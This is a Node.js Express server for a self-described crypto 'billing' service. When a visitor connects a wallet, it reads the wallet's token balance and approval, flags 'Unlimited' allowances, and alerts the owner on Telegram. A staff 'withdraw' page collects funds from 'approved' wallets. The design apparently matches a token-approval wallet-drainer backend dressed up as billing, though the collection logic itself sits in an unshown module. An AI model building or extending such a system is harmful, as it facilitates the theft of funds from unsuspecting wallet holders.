import express from 'express';
import crypto from 'node:crypto';
import path from 'node:path';
import fs from 'node:fs';
import { fileURLToPath } from 'node:url';
import { ethers } from 'ethers';
import { config, publicChain } from './config.js';
import './db.js';
import { formatUnits } from './units.js';
import { adapters, getAdapter, startHealth } from './chains/index.js';
import { notify, code as tgCode, link as tgLink, esc as tgEsc, publicTelegram, saveTelegramSettings, sendTest, findChat, TelegramError } from './notify.js';
import { mountBilling, BillingError, resolve } from './billing.js';
import { startTelegramBot, botSettings, saveBotSettings } from './telegramBot.js';

const app = express();
app.disable('x-powered-by');
// How many proxies sit in front of the server (Caddy / Nginx / Render = 1).
app.set('trust proxy', config.trustProxy);
app.use(express.json({ limit: '200kb' }));
app.use((req, res, next) => {
  res.set('X-Content-Type-Options', 'nosniff');
  res.set('Referrer-Policy', 'same-origin');
  // Optional CORS: only needed if pages on another domain call this API directly.
  const origin = req.get('origin');
  if (origin && config.allowedOrigins.includes(origin)) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Vary', 'Origin');
    res.set('Access-Control-Allow-Headers', 'content-type, x-admin-key, x-service-key, authorization');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PATCH, OPTIONS');
    if (req.method === 'OPTIONS') return res.sendStatus(204);
  }
  next();
});

app.get('/api/health', (req, res) => {
  const st = (a) => (a.status.ok ? 'connected' : a.status.ok === false ? 'not connected' : 'starting');
  res.json({
    ok: true,
    blockchain: adapters.every((a) => a.status.ok) ? 'connected' : adapters.some((a) => a.status.ok === false) ? 'not connected' : 'starting',
    chains: Object.fromEntries(adapters.map((a) => [a.key, {
      network: st(a), billing: a.ready ? 'configured' : 'not set up', charges: a.canCharge ? 'on' : 'off', problem: a.status.error,
    }])),
  });
});

// ---------- tiny per-IP rate limiter ----------
const hits = new Map();
function rateLimit(max, windowMs) {
  return (req, res, next) => {
    const key = `${req.path}:${req.ip}`;
    const now = Date.now();
    const list = (hits.get(key) || []).filter((t) => now - t < windowMs);
    if (list.length >= max) return res.status(429).json({ error: 'Too many requests. Wait a minute and try again.' });
    list.push(now);
    hits.set(key, list);
    next();
  };
}
setInterval(() => hits.clear(), 60 * 60 * 1000);

const wrap = (fn) => (req, res) =>
  Promise.resolve().then(() => fn(req, res)).catch((e) => {
    if (e instanceof BillingError || e instanceof TelegramError) return res.status(e.status).json({ error: e.message });
    console.error(e);
    res.status(500).json({ error: 'Something went wrong on our side. Try again.' });
  });

// ---------- public ----------
app.get('/api/config', (req, res) => {
  res.json({
    serviceName: config.serviceName,
    storeName: config.serviceName,   // older name, kept for compatibility
    projectId: config.reownProjectId,
    network: publicChain(config.network),
    chains: config.chains.map(publicChain),
    recipient: config.treasury,
    tronTreasury: config.tronTreasury,
    quick: config.quickSetup,
  });
});

// A visitor connected a wallet: tell the owner on Telegram (once per wallet every 6 hours).
const CHAINS = { 1: 'Ethereum', 56: 'BNB Smart Chain', 137: 'Polygon', 42161: 'Arbitrum', 8453: 'Base', 10: 'Optimism', 43114: 'Avalanche' };
const ERC20_READ = ['function balanceOf(address) view returns (uint256)', 'function allowance(address,address) view returns (uint256)'];
app.post('/api/events/wallet', rateLimit(30, 10 * 60 * 1000), wrap(async (req, res) => {
  const b = req.body || {};
  const address = String(b.address || '');
  if (!ethers.isAddress(address)) return res.status(400).json({ error: 'bad address' });
  const chainId = Number(b.chainId) || null;
  // which of our chains: explicit b.chain, else the EVM chain with this chainId, else by address format
  let r = null;
  try { r = resolve(address, b.chain || adapters.find((x) => x.family === 'evm' && x.chainId === chainId)?.key); } catch { /* unknown chain */ }
  const a = r?.a;
  let balance = '?'; let approval = null;
  if (a?.ready) {
    try {
      const c = await a.read(r.addr);
      balance = `${formatUnits(c.balance, a.token.decimals)} ${a.token.symbol}`;
      approval = c.allowance >= a.unlimitedAt ? 'Unlimited' : c.allowance === 0n ? 'none' : `${formatUnits(c.allowance, a.token.decimals)} ${a.token.symbol}`;
    } catch { /* RPC trouble: still send the alert */ }
  }
  const explorer = a ? a.addrUrl(r.addr) : '';
  notify('wallet_connect', [
    '👛 <b>Wallet connected</b>',
    `Address: ${tgCode(address)}`,
    `Wallet: ${tgEsc(String(b.wallet || 'unknown').slice(0, 40))}${b.dapp ? ' (inside a wallet app)' : ''}`,
    `Network: ${tgEsc(a?.name || CHAINS[chainId] || (chainId ? `chain ${chainId}` : 'unknown'))}`,
    a ? `${tgEsc(a.short)} balance: ${tgEsc(balance)}` : null,
    approval !== null ? `Billing approval: ${tgEsc(approval)}` : null,
    tgLink(explorer, 'View on explorer'),
  ], { dedupeKey: address.toLowerCase(), dedupeMs: 6 * 3600e3 });
  res.json({ ok: true });
}));

// ---------- admin ----------
function admin(req, res, next) {
  const a = Buffer.from(String(req.get('x-admin-key') || ''));
  const b = Buffer.from(config.adminKey);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return res.status(401).json({ error: 'Wrong admin key.' });
  next();
}
app.use('/api/admin', rateLimit(120, 60 * 1000), admin);

// Withdraw page (staff): ADMIN_KEY or WITHDRAW_KEY. Only lists approved customers and collects what is due.
function withdrawAuth(req, res, next) {
  const a = Buffer.from(String(req.get('x-admin-key') || ''));
  const ok = [config.adminKey, config.withdrawKey].filter(Boolean).some((k) => { const b = Buffer.from(k); return a.length === b.length && crypto.timingSafeEqual(a, b); });
  if (!ok) return res.status(401).json({ error: config.withdrawKey ? 'Wrong password.' : 'Wrong password. (Set WITHDRAW_KEY in .env to give staff their own password for this page.)' });
  next();
}
app.use('/api/withdraw', rateLimit(120, 60 * 1000), withdrawAuth);

// Billing: public, service and admin routes
mountBilling(app, { wrap, rateLimit });

app.get('/api/admin/overview', (req, res) => {
  res.json({
    serviceName: config.serviceName,
    network: publicChain(config.network),
    treasury: config.treasury,
    tronTreasury: config.tronTreasury,
    chains: adapters.map((a) => ({ ...publicChain(a), rpcSource: a.rpcSource, rpcEnvKey: a.rpcEnvKey, status: a.status, ready: a.ready })),
  });
});

// Telegram alerts
app.get('/api/admin/telegram', (req, res) => res.json({ ...publicTelegram(), bot: botSettings() }));
app.post('/api/admin/telegram', wrap((req, res) => {
  const b = req.body || {};
  const bot = (b.commands !== undefined || b.adminIds !== undefined || b.withdrawIds !== undefined) ? saveBotSettings({ commands: b.commands, adminIds: b.adminIds, withdrawIds: b.withdrawIds }) : botSettings();
  res.json({ ...saveTelegramSettings(b), bot });
}));
app.post('/api/admin/telegram/test', wrap(async (req, res) => { await sendTest(); res.json({ ok: true }); }));
app.post('/api/admin/telegram/find-chat', wrap(async (req, res) => res.json({ chats: await findChat() })));

// ---------- websites ----------
// When site/ and admin/ have been built (npm run build), this server serves
// them too: the customer page at /, the admin panel at /admin/.
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const siteDist = path.join(root, 'site', 'dist');
const adminDist = path.join(root, 'admin', 'dist');
if (fs.existsSync(adminDist)) {
  app.use('/admin', (req, res, next) => { res.set('X-Robots-Tag', 'noindex, nofollow'); res.set('X-Frame-Options', 'DENY'); next(); },
    express.static(adminDist));
}
if (fs.existsSync(siteDist)) {
  app.use(express.static(siteDist));
} else {
  app.get('/', (req, res) => res.type('text').send(`${config.serviceName} billing API is running on ${config.network.name}.`));
}
app.use('/api', (req, res) => res.status(404).json({ error: 'Not found' }));

// ---------- start ----------
app.listen(config.port, () => {
  console.log(`[server] ${config.serviceName} billing on http://localhost:${config.port}`);
  for (const a of adapters) console.log(`[server]   ${a.key}: ${a.token.symbol} on ${a.name}${a.ready ? '' : '  (not set up yet: see the Deploy contract page)'}`);
});
startHealth();
startTelegramBot();
